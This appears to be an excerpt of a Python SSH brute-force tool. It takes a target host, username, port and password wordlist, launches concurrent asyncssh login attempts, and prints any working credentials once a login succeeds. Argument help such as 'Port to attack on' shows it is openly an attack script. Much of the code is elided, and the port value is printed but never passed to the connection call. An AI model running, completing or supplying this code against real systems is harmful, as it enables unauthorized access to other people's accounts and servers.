...
def xargs():
    ...
    parser.add_argument('-p', '--port', dest='port', default=22, type=int, required=False, help="Port to attack on, Default:22")
...
async def xBruteForce(hostname, username, password, port, found_flag):
    ...
    try:
        async with asyncssh.connect(hostname, username=username, password=password) as conn:
            found_flag.set()
            print(colored(f"[{port}] [ssh] host:{hostname}  login:{username}  password:{password}", 'green'))
...
async def main(hostname, port, username, wordlist):
    """The Main function takes hostname,port, username,wordlist Defines concurrency limit and sends taks to xBruteForce function"""
    tasks = []
    passwords = []
    ...
    for password in passwords:
        ...
        if not found_flag.is_set():
            tasks.append(asyncio.create_task(xBruteForce(hostname, username, password, port, found_flag)))
